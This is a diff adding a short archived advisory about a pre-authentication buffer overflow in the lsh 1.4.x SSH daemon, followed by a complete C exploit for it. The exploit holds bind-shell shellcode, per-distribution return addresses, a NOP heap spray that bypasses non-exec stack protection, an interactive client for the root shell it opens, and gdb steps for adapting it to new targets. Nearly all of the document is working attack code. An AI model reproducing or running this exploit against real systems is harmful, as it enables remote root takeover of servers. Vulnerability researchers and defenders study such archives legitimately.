@@ -1,0 +1,310 @@
+source: http://www.securityfocus.com/bid/8655/info
+
+lsh has been reported prone to a remote buffer overflow vulnerability. The condition is reported to present itself in fairly restrictive circumstances, and has been reported to be exploitable pre-authentication. Successful exploitation could result in the execution of arbitrary attacker supplied instructions in the context of the affected daemon. 
+
+/*
+  --------------------------------------
+  Remote r00t exploit for lsh 1.4.x
+  by Haggis aka Carl Livitt - carl.learningshophull@co@uk
+  19/09/2003
+
+  Latest version should always be available from
+  http://doris.scriptkiddie.net
+  ------------------------------------
+
+  Spawns bindshell on port 12345 of remote host.
+
+  Handily, it also bypasses non-exec stack protection as the
+  shellcode is on the heap.
+
+  NOTE: This exploit _only_ works if it's the first thing to
+  connect to the lshd daemon after it has been started.
+  Any other time, it is just a DoS. Run it a few times against
+  a host running lshd to see what I mean.
+
+
+  --------------------------------------------
+  Determining RET address for a new platform:
+  ------------------------------------------
+
+  Start up 'lshd --daemonic', attach gdb to it and 'c'ontinue:
+
+	sol:~ # rm /var/run/lshd.pid ; lshd --daemonic ; gdb -q lshd `pgrep lshd`
+	Attaching to program: /usr/local/sbin/lshd, process 7140
+	Reading symbols from /lib/libpam.so.0...done.
+	Loaded symbols for /lib/libpam.so.0
+	Reading symbols from /lib/libutil.so.1...done.
+	Loaded symbols for /lib/libutil.so.1
+	Reading symbols from /lib/libnsl.so.1...done.
+	Loaded symbols for /lib/libnsl.so.1
+	Reading symbols from /lib/libcrypt.so.1...done.
+	Loaded symbols for /lib/libcrypt.so.1
+	Reading symbols from /lib/libz.so.1...done.
+	Loaded symbols for /lib/libz.so.1
+	Reading symbols from /usr/local/lib/liboop.so.4...done.
+	Loaded symbols for /usr/local/lib/liboop.so.4
+	Reading symbols from /usr/lib/libgmp.so.3...done.
+	Loaded symbols for /usr/lib/libgmp.so.3
+	Reading symbols from /lib/libc.so.6...done.
+	Loaded symbols for /lib/libc.so.6
+	Reading symbols from /lib/libdl.so.2...done.
+	Loaded symbols for /lib/libdl.so.2
+	Reading symbols from /lib/ld-linux.so.2...done.
+	Loaded symbols for /lib/ld-linux.so.2
+	Reading symbols from /lib/libnss_files.so.2...done.
+	Loaded symbols for /lib/libnss_files.so.2
+	0x40157d37 in fork () from /lib/libc.so.6
+	(gdb) c
+	Continuing.
+
+  Switch to another terminal, and run the exploit against the lsh
+  server, specifying target number 3 (Test):
+
+	haggis@sol:~/exploits/research/lsh> ./lsh_exploit -t localhost -T 3
+	LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)
+
+	[-] Building exploit buffer...
+	[-] Sending exploit string...
+	[-] Sleeping...
+	[-] Connecting to bindshell...
+	[*] Could not connect to localhost - the exploit failed
+
+  Switch back to your other terminal. You will see:
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41424344 in ?? ()
+
+
+  Type 'x/1000x $eax':
+
+	(gdb) x/1000x $eax
+
+  And wait until you find lines similar to these:
+
+	0x809fa68:      0x90909090      0x90909090      0x90909090      0x90909090
+	0x809fa78:      0x90909090      0x90909090      0x90909090      0x90909090
+	0x809faa8:      0x90909090      0x90909090      0x90909090      0x90909090
+	0x809fa9c:      0x90909090      0x90909090      0x90909090      0x90909090
+	^^^^^^^^^
+
+  Any of the addresses that contains a NOP (0x90) can be used as your RET address.
+  Create a new target in the source-code and Bob's-yer-uncle!
+*/
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <netdb.h>
+#include <time.h>
+#include <stdarg.h>
+
+#define SSH_PORT 22
+#define BINDSHELL_PORT 12345
+#define SIZ 8092
+#define EXPLOIT_BUF_SIZE 4000 	// just approximate - works well enough
+#define NOPS_LEN 1024
+
+/*
+ * Linux shellcode - binds /bin/sh to a port
+ *
+ * Claes M. Nyberg 20020620
+ *
+ * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>
+ */
+char shellcode[]=
+"\x83\xec\x10\x89\xe7\x31\xc0\x50\x50\x50\x66\x68\x30\x39\xb0\x02\x66\x50"
+"\x89\xe6\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x31\xdb\x43\x30\xe4\xb0\x66\xcd"
+"\x80\x89\xc5\x6a\x10\x56\x55\x89\xe1\x43\x31\xc0\xb0\x66\xcd\x80\x50\x55"
+"\x89\xe1\xb3\x04\xb0\x66\xcd\x80\xb0\x10\x50\x54\x57\x55\x89\xe1\xb3\x05"
+"\xb0\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd"
+"\x80\x41\xb0\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+"\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
+
+struct
+{
+	char *platform;
+	unsigned long retAddr;
+} targets[]= {
+	{ "SuSE 8.1   - LSH v1.4.x (default)", 0x0809fb20},
+	{ "RedHat 7.3 - LSH v1.4.x", 0x0809de90},
+	{ "RedHat 8.0 - LSH v1.4.x", 0x0809a9d8},
+	{ "Test. RET address = 0x41424344", 0x41424344},
+	NULL
+};
+
+void my_send(int, char *, ...);
+void my_recv(int);
+int connect_to_host(int);
+void my_sleep(int n);
+int do_bind_shell();
+
+struct hostent *hostStruct;
+char buf[SIZ], host[SIZ]="\0";
+int useTarget=0;
+char usage[]=
+"Usage: ./lsh_exploit -t host_name [-T platform_type]\n";
+
+main(int argc, char **argv)
+{
+	int ch, i, targetSock;
+	unsigned long *retPtr;
+	char *charRetPtr;
+
+	printf("LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)\n\n");
+	while((ch=getopt(argc, argv, "t:T:h"))!=-1) {
+		switch(ch) {
+			case 't':
+				strncpy(host, optarg, SIZ-1);
+				break;
+			case 'T':
+				useTarget=atoi(optarg);
+				break;
+			case 'h':
+			default:
+				printf("%s\n",usage);
+				printf("Available platforms:\n");
+				for(i=0;targets[i].platform;i++)
+					printf(" %2d. %s\n", i, targets[i].platform);
+				printf("\n");
+				exit(0);
+				break;
+		}
+	}
+
+	if(host[0]=='\0') {
+		printf("[*] You must specify a host! Use -h for help\n");
+		exit(1);
+	}
+	if((hostStruct=gethostbyname(host))==NULL) {
+		printf("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[0]);
+		exit(1);
+	}
+	if((targetSock=connect_to_host(SSH_PORT))==-1) {
+		printf("[*] Coulnd't connect to host %s\n", host);
+		exit(1);
+	}
+	my_recv(targetSock);
+
+	printf("[-] Building exploit buffer...\n");
+
+	retPtr=(unsigned long *)buf;
+	for(i=0;i<EXPLOIT_BUF_SIZE/4;i++)
+		*(retPtr++)=targets[useTarget].retAddr;
+
+	charRetPtr=(unsigned char *)retPtr;
+	for(i=0;i<NOPS_LEN-strlen(shellcode);i++)
+		*(charRetPtr++)=(unsigned long)0x90;
+
+	memcpy(charRetPtr, shellcode, strlen(shellcode));
+	*(charRetPtr+strlen(shellcode))='\n';
+	*(charRetPtr+strlen(shellcode)+1)='\0';
+
+	printf("[-] Sending exploit string...\n");
+	my_send(targetSock, buf);
+	close(targetSock);
+
+	printf("[-] Sleeping...\n");
+	my_sleep(100000);
+
+	printf("[-] Connecting to bindshell...\n");
+	if(do_bind_shell()==-1)
+		printf("[*] Could not connect to %s - the exploit failed\n", host);
+
+	exit(0);
+}
+
+int do_bind_shell()
+{
+	fd_set rfds;
+	int sock,retVal,r;
+
+	if((sock=connect_to_host(BINDSHELL_PORT))==-1)
+		return -1;
+
+	printf("[-] Success!!! You should now be r00t on %s\n", host);
+	do {
+		FD_ZERO(&rfds);
+		FD_SET(0, &rfds);
+		FD_SET(sock, &rfds);
+		retVal=select(sock+1, &rfds, NULL, NULL, NULL);
+		if(retVal) {
+			if(FD_ISSET(sock, &rfds)) {
+				buf[(r=recv(sock, buf, SIZ-1,0))]='\0'; // bad!
+				printf("%s", buf);
+			}
+			if(FD_ISSET(0, &rfds)) {
+				buf[(r=read(0, buf, SIZ-1))]='\0'; // bad!
+				send(sock, buf, strlen(buf), 0);
+			}
+
+		}
+	} while(retVal && r); // loop until connection terminates
+
+	close(sock);
+	return 1;
+}
+
+// Given a port number, connects to an already resolved hostname...
+// connects a TCP stream and returns a socket number (or returns error)
+int connect_to_host(int p)
+{
+	int sock;
+	struct sockaddr_in saddr;
+
+	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+		return -1;
+	memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
+	saddr.sin_family=AF_INET;
+	saddr.sin_addr.s_addr=*((unsigned long *)hostStruct->h_addr_list[0]);
+	saddr.sin_port=htons(p);
+	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
+		close(sock);
+		return -1;
+	} else
+	return sock;
+}
+
+
+// Handy little function to send formattable data down a socket.
+void my_send(int s, char *b, ...)
+{
+	va_list ap;
+	char *buf;
+
+	va_start(ap,b);
+	vasprintf(&buf,b,ap);
+	send(s,buf,strlen(buf),0);
+	va_end(ap);
+	free(buf);
+}
+
+
+// Another handy function to read data from a socket.
+void my_recv(int s)
+{
+	int len;
+	char buf[SIZ];
+
+	len=recv(s, buf, SIZ-1, 0);
+	buf[len]=0;
+}
+
+
+// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.
+void my_sleep(int n)
+{
+	struct timespec t;
+	t.tv_sec=0;
+	t.tv_nsec=n;
+	nanosleep(&t,&t);
+}
+
+
